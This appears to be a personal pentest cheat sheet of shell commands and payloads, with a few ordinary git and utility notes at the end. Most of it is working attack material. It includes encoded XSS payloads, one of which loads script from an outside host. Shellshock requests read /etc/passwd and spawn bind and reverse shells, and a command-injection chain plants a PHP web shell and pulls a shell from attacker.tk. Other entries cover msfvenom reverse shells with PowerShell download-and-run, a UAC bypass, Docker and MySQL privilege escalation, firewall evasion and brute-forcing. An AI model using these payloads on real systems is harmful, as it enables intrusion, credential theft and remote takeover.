<IMG SRC=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;>

<IMG SRC=&amp;amp;#0000106&amp;amp;#0000097&amp;amp;#0000118&amp;amp;#0000097&amp;amp;#0000115&amp;amp;#0000099&amp;amp;#0000114&amp;amp;#0000105&amp;amp;#0000112&amp;amp;#0000116&amp;amp;#0000058&amp;amp;#0000097&amp;amp;#0000108&amp;amp;#0000101&amp;amp;#0000114&amp;amp;#0000116&amp;amp;#0000040&amp;amp;#0000039&amp;amp;#0000088&amp;amp;#0000083&amp;amp;#0000083&amp;amp;#0000039&amp;amp;#0000041>
<IMG SRC="jav ascript:alert('XSS');">

perl -e 'print "<IMG SRC=javascript:alert(\"XSS\")>";' > out

<BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")>

(">< iframes http://google.com < iframes >)

<BODY BACKGROUND="javascript:alert('XSS')">
<FRAMESET><FRAME SRC=”javascript:alert('XSS');"></FRAMESET>
"><script >alert(document.cookie)</script>
%253cscript%253ealert(document.cookie)%253c/script%253e
"><s"%2b"cript>alert(document.cookie)</script>
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E
<img src=asdf onerror=alert(document.cookie)>
```
### SSH Over SCTP (With Socat)
```
# on remote server
# assuming you want the SCTP socket to listen on port 80/SCTP and sshd is on 22/TCP
$ socat SCTP-LISTEN:80,fork TCP:localhost:22

# localhost
# replace SERVER_IP with IP of listening server, and 80 with whatever port the SCTP listener is on :)
$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80

# create socks proxy
# replace username and -p port value as needed...
$ ssh -lusername localhost -D 8080 -p 1337
```
### Install Metasploit Community Edition in Kali 2.0
```
# github urls
https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version

wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run && chmod
+x metasploit-latest-linux-x64-installer.run && ./metasploit-latest-linux-x64-installer.run

# create user
$ /opt/metasploit/createuser
[*] Please enter a username: root
[*] Creating user 'root' with password 'LsRRV[I^5' ...

# activate your metasploit license
https://localhost:3790

# update metasploite
$ /opt/metasploit/app/msfupdate

# use msfconsole
$ /opt/metasploit/app/msfconsole
```
### Tor Nat Traversal
```
# install to server
$ apt-get install tor torsocks

# or in mac os
$ brew install torsocks

# bind ssh to tor service port 80
$mkdir -p /var/lib/tor/ssh_hidden_service/
$chmod 700 /var/lib/tor/ssh_hidden_service/
# vi /etc/tor/torrc
SocksPolicy accept 127.0.0.1
Log notice file /var/log/tor/notices.log
RunAsDaemon 1
HiddenServiceDir /var/lib/tor/ssh_hidden_service/
HiddenServicePort 80 127.0.0.1:1221
PublishServerDescriptor 0
$ /etc/init.d/tor stop;/etc/init.d/tor start;tor

# or
$service tor start

# or
$tor --service start
$/etc/init.d/tor status
$cat /var/log/tor/notices.log
$ netstat -lntp|grep tor
$cat /lib/systemd/system/tor.service

$ cat /var/lib/tor/ssh_hidden_service/hostname
3l5zstvt1zk5jhl662.onion


# ssh connect from client
$ apt-get install torsocks
$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80

```

### DNS brute forcing with fierce
```
# http://ha.ckers.org/fierce/
$ ./fierce.pl -dns example.com
$ ./fierce.pl –dns example.com –wordlist myWordList.txt
```
### Metagoofil metadata gathering tool
```
# http://www.edge-security.com/metagoofil.php
#automate search engine document retrieval and analysis. It also has the capability to provide MAC
# addresses, username listings, and more
$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html
```
### A best NMAP scan strategy
```
# A best nmap scan strategy for networks of all sizes

# Host Discovery - Generate Live Hosts List
$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24
$ grep "Status: Up" Discovery.gnmap | cut -f 2 -d ' ' > LiveHosts.txt

# Port Discovery - Most Common Ports
# http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf
$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt
$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt

# Port Discovery - Full Port Scans (UDP is very slow)
$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt

# Print TCP\UDP Ports
$ grep "open" FullTCP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print "T:"$0}'
$ grep "open" FullUDP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print "U:"$0}'

# Detect Service Version
$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt

# Operating System Scan
$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt

# OS and Service Detect
$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
```
### Nmap – Techniques for Avoiding Firewalls
```
# fragmentation
$ nmap -f

# change default MTU size number must be a multiple of 8 (8,16,24,32 etc)
$ nmap --mtu 24

# Generates a random number of decoys
$ nmap -D RND:10 [target]

# Manually specify the IP addresses of the decoys
$ nmap -D decoy1,decoy2,decoy3 etc.

# Idle Zombie Scan, first t need to find zombie ip
$ nmap -sI [Zombie IP] [Target IP]

# Source port number specification
$ nmap --source-port 80 IP

# Append Random Data to scan packages
$ nmap --data-length 25 IP

# MAC Address Spoofing, generate different mac for host pc
$ nmap --spoof-mac Dell/Apple/3Com IP

```
### Exploit servers to Shellshock
```
# A tool to find and exploit servers vulnerable to Shellshock
# https://github.com/nccgroup/shocker
$ ./shocker.py -H 192.168.56.118  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose

# cat file
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80

# bind shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80

# reverse Shell
$ nc -l -p 443
$ echo "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80

```
### Root with Docker
```
# get root with docker
# user must be in docker group
ek@victum:~/docker-test$ id
uid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)

ek@victum:~$ mkdir docker-test
ek@victum:~$ cd docker-test

ek@victum:~$ cat > Dockerfile
FROM debian:wheezy

ENV WORKDIR /stuff

RUN mkdir -p $WORKDIR

VOLUME [ $WORKDIR ]

WORKDIR $WORKDIR
<< EOF

ek@victum:~$ docker build -t my-docker-image .
ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \
'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh'
./sh
whoami
# root

ek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c 'cat /stuff/shadow'

```
### Tunneling Over DNS to Bypass Firewall
```
# Tunneling Data and Commands Over DNS to Bypass Firewalls
# dnscat2 supports "download" and "upload" commands for getting files (data and programs) to and from # the victim’s host.

# server (attacker)
$ apt-get update
$ apt-get -y install ruby-dev git make g++
$ gem install bundler
$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/server
$ bundle install
$ ruby ./dnscat2.rb
dnscat2> New session established: 16059
dnscat2> session -i 16059

# client (victum)
# https://downloads.skullsecurity.org/dnscat2/
# https://github.com/lukebaggett/dnscat2-powershell
$ dnscat --host <dnscat server_ip>
```
### Compile Assemble code
```
$ nasm -f elf32 simple32.asm -o simple32.o
$ ld -m elf_i386 simple32.o simple32

$ nasm -f elf64 simple.asm -o simple.o
$ ld simple.o -o simple
```

### Pivoting to Internal Network Via Non Interactive Shell
```
# generate ssh key with shell
$ wget -O - -q "http://domain.tk/sh.php?cmd=whoami"
$ wget -O - -q "http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \"\" "
$ wget -O - -q "http://domain.tk/sh.php?cmd=cat /tmp/id_rsa"

# add tempuser at attacker ps
$ useradd -m tempuser
$ mkdir /home/tempuser/.ssh && chmod 700 /home/tempuser/.ssh
$ wget -O - -q "http://domain.tk/sh.php?cmd=cat /tmp/id_rsa" > /home/tempuser/.ssh/authorized_keys
$ chmod 700 /home/tempuser/.ssh/authorized_keys
$ chown -R tempuser:tempuser /home/tempuser/.ssh

# create reverse ssh shell
$ wget -O - -q "http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@<attacker_ip>"
```
### Patator is a multi-purpose brute-forcer
```
# git clone https://github.com/lanjelot/patator.git /usr/share/patator

# SMTP bruteforce
$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
$ patator smtp_login host=192.168.17.129 helo='ehlo 192.168.17.128' user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep='incorrect password or account name'

```
### Metasploit Web terminal via Gotty
```
$ service postgresql start
$ msfdb init
$ apt-get install golang
$ mkdir /root/gocode
$ export GOPATH=/root/gocode
$ go get github.com/yudai/gotty
$ gocode/bin/gotty -a 127.0.0.1 -w msfconsole
# open in browser http://127.0.0.1:8080
```
### Get full shell with POST RCE
```
attacker:~$ curl -i -s -k  -X 'POST' --data-binary $'IP=%3Bwhoami&submit=submit' 'http://victum.tk/command.php'

attacker:~$ curl -i -s -k  -X 'POST' --data-binary $'IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&submit=submit' 'http://victum.tk/command.php'

attacker:~$ curl http://victum.tk/shell.php?cmd=id

# download reverse shell to server (phpshell.php)
http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27

# run nc and execute phpshell.php
attacker:~$ nc -nvlp 1337
```
### Exiftool - Read and write meta information in files
```
$ wget http://www.sno.phy.queensu.ca/~phil/exiftool/Image-ExifTool-10.13.tar.gz
$ tar xzf Image-ExifTool-10.13.tar.gz
$ cd Image-ExifTool-10.13
$ perl Makefile.PL
$ make
$ ./exiftool main.gif
```
### Get SYSTEM with Admin reverse_shell on Win7
```
msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe > danger.exe

#show account settings
net user <login>

# download psexec to kali
https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx

# upload psexec.exe file onto the victim machine with powershell script
echo $client = New-Object System.Net.WebClient > script.ps1
echo $targetlocation = "http://192.168.56.102/PsExec.exe" >> script.ps1
echo $client.DownloadFile($targetlocation,"psexec.exe") >> script.ps1
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1

# upload danger.exe file onto the victim machine with powershell script
echo $client = New-Object System.Net.WebClient > script2.ps1
echo $targetlocation = "http://192.168.56.102/danger.exe" >> script2.ps1
echo $client.DownloadFile($targetlocation,"danger.exe") >> script2.ps1
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1

# UAC bypass from precompiled binaries:
https://github.com/hfiref0x/UACME

# upload https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe to victim pc with powershell
echo $client = New-Object System.Net.WebClient > script2.ps1
echo $targetlocation = "http://192.168.56.102/Akagi64.exe" >> script3.ps1
echo $client.DownloadFile($targetlocation,"Akagi64.exe") >> script3.ps1
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1

# create listener on kali
nc -lvp 4444

# Use Akagi64 to run the danger.exe file with SYSTEM privileges
Akagi64.exe 1 C:\Users\User\Desktop\danger.exe

# create listener on kali
nc -lvp 4444

# The above step should give us a reverse shell with elevated privileges
# Use PsExec to run the danger.exe file with SYSTEM privileges
psexec.exe –i –d –accepteula –s danger.exe
```

### Get SYSTEM with Standard user reverse_shell on Win7
```
https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051
https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html
https://www.exploit-db.com/exploits/37049/

# check the list of patches applied on the target machine
# to get the list of Hotfixes installed, type in the following command.
wmic qfe get
wmic qfe | find "3057191"

# Upload compile exploit to victim machine and run it
https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe

# by default exploite exec cmd.exe with SYSTEM privileges, we need to change source code to run danger.exe
# https://github.com/hfiref0x/CVE-2015-1701 download it and navigate to the file "main.c"

# dump clear text password of the currently logged in user using wce.exe
http://www.ampliasecurity.com/research/windows-credentials-editor/
wce -w

# dump hashes of other users with pwdump7
http://www.heise.de/download/pwdump.html
# we can try online hash cracking tools such crackstation.net
```
### Generate our own dic file based on the website content
```
$ cewl -m 4 -w dict.txt http://site.url
$ john --wordlist=dict.txt --rules --stdout
```
### Bruteforce DNS records using Nmap
```
$ nmap --script dns-brute --script-args dns-brute.domain=foo.com,dns-brute.threads=6,dns-brute.hostlist=./hostfile.txt,newtargets -sS -p 80
$ nmap --script dns-brute www.foo.com
```

### Identifying a WAF with Nmap
```
$ nmap -p 80,443 --script=http-waf-detect 192.168.56.102
$ nmap -p 80,443 --script=http-waf-fingerprint 192.168.56.102
$ wafw00f www.example.com
```
### MS08-067 - without the use of Metasploit
```
$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205
$ searchsploit ms08-067
$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1
```

### Nikto scan with SQUID proxy
```
$ nikto -useproxy http://squid_ip:3128 -h http://target_ip
```
### Hijack a binary’s full path in bash to exec your own code
```
$ function /usr/bin/foo () { /usr/bin/echo "It works"; }
$ export -f /usr/bin/foo
$ /usr/bin/foo
It works
```
### Local privilege escalation through MySQL run with root privileges
```
# Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)
$ wget 0xdeadbeef.info/exploits/raptor_udf2.c
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/user/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
mysql> select do_system('echo "root:passwd" | chpasswd > /tmp/out; chown user:user /tmp/out');

user:~$ su -
Password:
user:~# whoami
root
root:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Bruteforce SSH login with patator
```
root:~# patator ssh_login host=192.168.0.18 user=FILE0 password=FILE1 0=word.txt 1=word.txt -x ignore:mesg='Authentication failed.'
```
### Using LD_PRELOAD to inject features to programs
```
$ wget https://github.com/jivoi/pentest/ldpreload_shell.c
$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so
$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft
```
### Exploit the OpenSSH User Enumeration Timing Attack
```
# https://github.com/c0r3dump3d/osueta
$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes
$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt
```
### Create a TCP circuit through validly formed HTTP requests with ReDuh
```
# https://github.com/sensepost/reDuh

# step 1
# upload reDuh.jsp to victim server
$ http://192.168.10.50/uploads/reDuh.jsp

# step 2
# run reDuhClient on attacker
$ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp

# step 3
# connecting to management port with nc
$ nc -nvv 127.0.0.1 1010

# step 4
# forward localport to remote port with tunnel
[createTunnel] 7777:172.16.0.4:3389

# step 5
# connect to localhost with rdp
$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777
```


### github push提速
```
# 先启动加速的socks5 端口1080
git config http.postBuffer 524288000
git config https.postBuffer 524288000
git config --global --add http.proxy 'socks5://127.0.0.1:1080'
git config --global --add https.proxy 'socks5://127.0.0.1:1080'
git gc --aggressive
git push --set-upstream origin master

# git remote set-url origin git@github.com:hktalent/myhktools.git
git remote set-url origin https://github.com/hktalent/myhktools.git

git remote set-url upstream https://github.com/offensive-security/exploit-database-papers.git
git pull https://github.com/offensive-security/exploit-database-papers.git master

ls -al ~/.ssh
ssh-keygen -t rsa -b 4096 -C "xxx@qq.com"
$ eval "$(ssh-agent -s)"
Agent pid 8231

$ vi ~/.ssh/config
Host github.com
 AddKeysToAgent yes
 UseKeychain yes
 IdentityFile ~/.ssh/github
 Hostname ssh.github.com
 Port 443
 
 $ pbcopy < ~/.ssh/github.pub
 
 $ ssh-add -K ~/.ssh/github
Identity added: /Users/xx/.ssh/github (/Users/xx/.ssh/github)

$git remote set-url origin git://github.com/hktalent/myhktools.git
git remote -v

# https://www.atlassian.com/git/tutorials/git-lfs#moving-between-hosts
brew install git-lfs
git lfs install
git lfs install --system
git lfs track "*.jar"
git add .gitattributes
git lfs push origin master
git lfs fetch --all
git lfs fetch --recent

git lfs prune --dry-run --verbose
	
git config --global user.name hktalent
git config --global user.email 3135773@qq.com
# test: https://gist.github.com/developius/c81f021eb5c5916013dc
ssh -T -p 443 git@github.com
git rm --cached -r jars
git commit --amend -CHEAD
git push -u origin master
git push
git config --global -e
```

# 7z
```
7z a all.7z a.txt b.txt
7z l all.7z 
7z x all.7z 
```

# Non-root can't bind to ports <1024"? Not since Linux 4.11 in May 2017（绑定端口小于1024）
```
$ nc -nvlp 1
nc: Permission denied
$ echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start
0
$ nc -nvlp 1
Listening on [0.0.0.0] (family 0, port 1)
```

# disabled ssh banner
```
touch ~/.hushlogin
cp /usr/sbin/sshd /usr/sbin/shhd.bak
# sed -i 's/OpenSSH_7.6p1/xxxxxxxxxxxxx/g' /usr/sbin/sshd
# sed -i 's/SSH-/xxxx/g' /usr/sbin/sshd
如果启动失败、恢复：
cp /usr/sbin/shhd.bak /usr/sbin/sshd
systemctl restart ssh.service
```

# 查看指定端口的pid
```
# lsof -i :8080
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
PM2\x20v3 152 root   12u  IPv6  21677      0t0  TCP *:http-alt (LISTEN)
```

# 查看指定pid的相关资源信息
```
# lsof -p 152
COMMAND   PID USER   FD      TYPE             DEVICE SIZE/OFF    NODE NAME
PM2\x20v3 152 root  cwd       DIR              0,111     4096   16422 /root
PM2\x20v3 152 root  rtd       DIR              0,111     4096   16019 /
...

```

# 连接远程的vnc服务，也可以是mac os系统
```
vncviewer 192.168.0.100
brew install gtk-vnc
gnvcviewer 192.168.0.100 
```

# crack zip password，破解zip文件密码
```
crunch 6 6 1234567890 -o /root/numericwordlist.lst
fcrackzip  -v -l 4-6 -D -p /root/numericwordlist.lst -m zip2 -u ls.zip
```

# bu men info
```
cat bmInfo1.txt |sed  -e's/"//g' |tr -d "\{"|tr "}" "\n\n\n"|sed 's/null//g'|sed 's/.*\[//g'|sed 's/\].*$//g'|tr ":" "\n"|tr "," "\n"
```

# other
```
grep -Eo "(192\.[^\"]+)" gs09.25.xml|sort -u
```
